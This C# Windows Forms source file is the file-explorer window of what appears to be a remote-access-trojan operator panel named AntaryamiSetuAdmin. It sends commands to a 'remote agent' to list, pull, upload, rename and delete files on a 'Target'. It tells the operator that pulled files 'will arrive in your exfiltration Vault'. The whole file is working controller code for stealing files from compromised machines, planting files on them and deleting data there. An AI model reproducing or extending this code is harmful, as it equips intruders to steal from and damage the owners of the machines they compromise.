using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Text.Json;
using System.Collections.Generic;

namespace AntaryamiSetuAdmin
{
    public class FileManagerForm : Form
    {
        private readonly ClientSession _session;
        private TextBox? _txtPath;
        private ListView? _lvExplorer;
        private Button? _btnGo;
        private Button? _btnUp;
        private ContextMenuStrip? _contextMenu;

        private readonly Color ColBg = Color.FromArgb(5, 5, 5);
        private readonly Color ColPanel = Color.FromArgb(12, 12, 12);
        private readonly Color ColGreen = Color.FromArgb(0, 255, 64);
        private readonly Color ColCyan = Color.FromArgb(0, 200, 255);
        private readonly Color ColRed = Color.FromArgb(255, 30, 30);
        private readonly Color ColBorder = Color.FromArgb(0, 100, 30);

        public FileManagerForm(ClientSession session)
        {
            _session = session;
            InitializeGUI();

            _session.OnDirectoryListReceived = HandleDirectoryList;

            // Load remote agent's current working directory
            _txtPath!.Text = _session.CurrentPath;
            RequestDirectory(_session.CurrentPath);
        }

        private void InitializeGUI()
        {
            this.Text = $"★ FILE EXPLORER // {_session.DeviceName} ★";
            this.Size = new Size(800, 550);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = ColBg;
            this.ForeColor = ColGreen;
            this.Font = new Font("Consolas", 10F);
            this.Icon = Program.GetAppIcon();

            TableLayoutPanel layout = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                ColumnCount = 1,
                RowCount = 2,
                BackColor = Color.Transparent
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 50F)); // Address Bar Row
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 100F));  // Viewport Row
            this.Controls.Add(layout);

            // Path Panel
            Panel pnlPath = new Panel { Dock = DockStyle.Fill, BackColor = ColPanel, Padding = new Padding(10) };
            layout.Controls.Add(pnlPath, 0, 0);

            _btnUp = new Button
            {
                Text = "⮝ UP",
                Location = new Point(10, 10),
                Size = new Size(60, 28),
                BackColor = Color.Transparent,
                ForeColor = ColCyan,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Consolas", 9F, FontStyle.Bold),
                Cursor = Cursors.Hand
            };
            _btnUp.FlatAppearance.BorderColor = ColCyan;
            _btnUp.Click += BtnUp_Click;
            pnlPath.Controls.Add(_btnUp);

            _txtPath = new TextBox
            {
                Location = new Point(80, 11),
                Size = new Size(580, 26),
                BackColor = ColBg,
                ForeColor = ColGreen,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Consolas", 11F)
            };
            _txtPath.KeyDown += (s, e) => { if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; RequestDirectory(_txtPath.Text); } };
            pnlPath.Controls.Add(_txtPath);

            _btnGo = new Button
            {
                Text = "GO ⮚",
                Location = new Point(670, 10),
                Size = new Size(60, 28),
                BackColor = Color.Transparent,
                ForeColor = ColGreen,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Consolas", 9F, FontStyle.Bold),
                Cursor = Cursors.Hand
            };
            _btnGo.FlatAppearance.BorderColor = ColGreen;
            _btnGo.Click += (s, e) => RequestDirectory(_txtPath.Text);
            pnlPath.Controls.Add(_btnGo);

            // ListView Explorer
            _lvExplorer = new ListView
            {
                Dock = DockStyle.Fill,
                View = View.Details,
                BackColor = Color.FromArgb(10, 10, 10),
                ForeColor = Color.White,
                FullRowSelect = true,
                Font = new Font("Consolas", 9.5F),
                BorderStyle = BorderStyle.FixedSingle
            };
            _lvExplorer.Columns.Add("Name", 350);
            _lvExplorer.Columns.Add("Type", 120);
            _lvExplorer.Columns.Add("Size", 120);
            _lvExplorer.DoubleClick += LvExplorer_DoubleClick;
            layout.Controls.Add(_lvExplorer, 0, 1);

            // Context Menu Setup
            _contextMenu = new ContextMenuStrip();
            ToolStripMenuItem menuDownload = new ToolStripMenuItem("Download File");
            menuDownload.Click += MenuDownload_Click;
            
            ToolStripMenuItem menuUpload = new ToolStripMenuItem("Upload File Here");
            menuUpload.Click += MenuUpload_Click;

            ToolStripMenuItem menuRename = new ToolStripMenuItem("Rename");
            menuRename.Click += MenuRename_Click;

            ToolStripMenuItem menuDelete = new ToolStripMenuItem("Delete");
            menuDelete.Click += MenuDelete_Click;

            _contextMenu.Items.AddRange(new ToolStripItem[] { menuDownload, menuUpload, new ToolStripSeparator(), menuRename, menuDelete });
            _lvExplorer.ContextMenuStrip = _contextMenu;
        }

        private void RequestDirectory(string path)
        {
            SendCommandDirect($"fm_list {path}");
        }

        private void HandleDirectoryList(byte[] payload)
        {
            if (InvokeRequired) { Invoke(new Action(() => HandleDirectoryList(payload))); return; }

            try
            {
                _lvExplorer!.Items.Clear();
                string json = Encoding.UTF8.GetString(payload);
                using JsonDocument doc = JsonDocument.Parse(json);
                var root = doc.RootElement;

                _txtPath!.Text = root.GetProperty("current_path").GetString() ?? "";

                foreach (var item in root.GetProperty("items").EnumerateArray())
                {
                    string name = item.GetProperty("name").GetString() ?? "";
                    bool isDir = item.GetProperty("is_dir").GetBoolean();
                    long size = item.GetProperty("size").GetInt64();

                    ListViewItem lvItem = new ListViewItem(name);
                    lvItem.SubItems.Add(isDir ? "Folder" : "File");
                    lvItem.SubItems.Add(isDir ? "" : $"{size / 1024.0:F2} KB");
                    lvItem.ForeColor = isDir ? ColCyan : Color.White;
                    lvItem.Tag = isDir; // Stores if directory or file

                    _lvExplorer.Items.Add(lvItem);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to load directory details: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void LvExplorer_DoubleClick(object? sender, EventArgs e)
        {
            if (_lvExplorer!.SelectedItems.Count == 0) return;
            ListViewItem item = _lvExplorer.SelectedItems[0];
            bool isDir = (bool)item.Tag;

            if (isDir)
            {
                string nextPath = Path.Combine(_txtPath!.Text, item.Text);
                RequestDirectory(nextPath);
            }
        }

        private void BtnUp_Click(object? sender, EventArgs e)
        {
            string current = _txtPath!.Text;
            try
            {
                DirectoryInfo? parent = Directory.GetParent(current);
                if (parent != null)
                {
                    RequestDirectory(parent.FullName);
                }
            }
            catch { }
        }

        private void MenuDownload_Click(object? sender, EventArgs e)
        {
            if (_lvExplorer!.SelectedItems.Count == 0) return;
            ListViewItem item = _lvExplorer.SelectedItems[0];
            bool isDir = (bool)item.Tag;

            if (!isDir)
            {
                string filePath = Path.Combine(_txtPath!.Text, item.Text);
                SendCommandDirect($"pull {filePath}");
                MessageBox.Show($"File download requested for: {item.Text}. It will arrive in your exfiltration Vault soon.", "Download Scheduled", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void MenuUpload_Click(object? sender, EventArgs e)
        {
            using OpenFileDialog ofd = new OpenFileDialog { Title = "Select File to Push to Target" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    string localFile = ofd.FileName;
                    string destFile = Path.Combine(_txtPath!.Text, Path.GetFileName(localFile));

                    if (_session.IsHttp) return;

                    byte[] fileBytesRaw = File.ReadAllBytes(localFile);
                    byte[] fnBytes = Encoding.UTF8.GetBytes(destFile);
                    byte[] payload = new byte[4 + fnBytes.Length + fileBytesRaw.Length];
                    Array.Copy(BitConverter.GetBytes(fnBytes.Length), 0, payload, 0, 4);
                    Array.Copy(fnBytes, 0, payload, 4, fnBytes.Length);
                    Array.Copy(fileBytesRaw, 0, payload, 4 + fnBytes.Length, fileBytesRaw.Length);
                    
                    _session.SendPacket(6, payload);

                    MessageBox.Show("File upload request sent to agent.", "Upload Initiated", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    
                    // Refresh folder list after a delay
                    System.Windows.Forms.Timer t = new System.Windows.Forms.Timer { Interval = 1500 };
                    t.Tick += (obj, ev) => { RequestDirectory(_txtPath.Text); t.Stop(); };
                    t.Start();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Upload error: " + ex.Message);
                }
            }
        }

        private void MenuRename_Click(object? sender, EventArgs e)
        {
            if (_lvExplorer!.SelectedItems.Count == 0) return;
            ListViewItem item = _lvExplorer.SelectedItems[0];
            string oldPath = Path.Combine(_txtPath!.Text, item.Text);

            string newName = Microsoft.VisualBasic.Interaction.InputBox("Enter new name:", "Rename", item.Text);
            if (!string.IsNullOrWhiteSpace(newName) && newName != item.Text)
            {
                string newPath = Path.Combine(_txtPath.Text, newName);
                SendCommandDirect($"fm_rename {oldPath}|{newPath}");
                
                System.Windows.Forms.Timer t = new System.Windows.Forms.Timer { Interval = 1000 };
                t.Tick += (obj, ev) => { RequestDirectory(_txtPath.Text); t.Stop(); };
                t.Start();
            }
        }

        private void MenuDelete_Click(object? sender, EventArgs e)
        {
            if (_lvExplorer!.SelectedItems.Count == 0) return;
            ListViewItem item = _lvExplorer.SelectedItems[0];
            string targetPath = Path.Combine(_txtPath!.Text, item.Text);

            var result = MessageBox.Show($"Are you sure you want to permanently delete: {item.Text}?", "Confirm Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (result == DialogResult.Yes)
            {
                SendCommandDirect($"fm_delete {targetPath}");
                
                System.Windows.Forms.Timer t = new System.Windows.Forms.Timer { Interval = 1000 };
                t.Tick += (obj, ev) => { RequestDirectory(_txtPath.Text); t.Stop(); };
                t.Start();
            }
        }

        private void SendCommandDirect(string command)
        {
            if (!_session.IsActive) return;

            if (_session.IsHttp)
            {
                DashboardForm.SendHttpCommand(_session.DeviceId, command);
                return;
            }

            try
            {
                byte[] cmdBytes = Encoding.UTF8.GetBytes(command);
                _session.SendPacket(2, cmdBytes);
            }
            catch { }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _session.OnDirectoryListReceived = null;
            base.OnFormClosing(e);
        }
    }
}
